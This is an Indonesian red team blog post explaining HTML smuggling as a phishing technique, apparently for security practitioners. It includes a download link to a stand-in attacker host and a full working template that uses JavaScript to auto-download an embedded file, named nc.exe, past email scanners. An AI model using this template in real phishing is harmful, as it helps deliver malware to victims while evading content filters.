---
title: '03 - [Phishing] HTML Smuggling'
date: 2023-07-19 15:05:22 +0700
categories: ['Red Team', 'Social Engineering']
tags: [red team, social engineering, phishing, templates]     # TAG names should always be lowercase
author: nairpaa
---

**HTML smuggling** adalah teknik yang menggunakan JavaScript untuk menyembunyikan file dari filter konten.  

Jika Anda mengirim email *phishing* dengan link unduhan, HTML-nya mungkin akan terlihat seperti ini:

```html
<a href="http://attacker.com/file.doc">Download Me</a>
```

Email dan web *scanner* mampu mem-*parsing*-nya dan mengambil beberapa tindakan. Link tersebut dapat dihapus seluruhnya, atau konten URL diambil dan di-*scan* oleh *AV sandbox*.  

HTML *smuggling* memungkinkan kita untuk menyembunyikannya dengan menyematkan *payload* ke dalam kode HTML dan menggunakan JavaScript untuk membuat browser mengunduh file yang ditentukan pada saat *runtime*.

Berikut adalah contoh kode sederhana yang dibuat oleh [Stan Hegt](https://twitter.com/stanhacked):

```html
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'nc.exe';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```

Pada kode HTML di atas, *scanner* akan melihatnya sebagai HTML dan JavaScript biasa, tidak ada kode *hyperlink*.

Ketika korban mengakses file halaman HTML tersebut, secara otomatis dia akan mengunduh file yang telah ditentukan.

![HTML Smuggling](/assets/img/posts/html-smuggling/1.png){: w="650" h="550" }
_HTML Smuggling_

